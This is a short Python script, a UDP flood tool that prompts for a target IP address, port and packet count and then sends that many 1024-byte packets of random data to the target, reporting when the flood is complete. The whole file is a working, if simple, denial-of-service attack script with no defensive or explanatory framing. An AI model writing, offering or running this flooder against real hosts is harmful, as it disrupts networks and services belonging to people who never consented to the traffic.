import socket as so
import random

targetIp = input("Enter an IP target: \n")
targetPort = int(input("Enter a Port number target: \n"))
num_packets = int(input("How many packets do u want to send?: \n")) 

s = so.socket(so.AF_INET, so.SOCK_DGRAM)
packetSize = 1024

for _ in range(num_packets):
        try:
            randomBytes = bytes(random.getrandbits(8) for _ in range(packetSize))
            s.sendto(randomBytes, (targetIp, targetPort))
            print(f"Sending {len(randomBytes)} bytes to {targetIp}:{targetPort}")
        except:
            print("Error sending packets!")

print("Flood completed!")
s.close()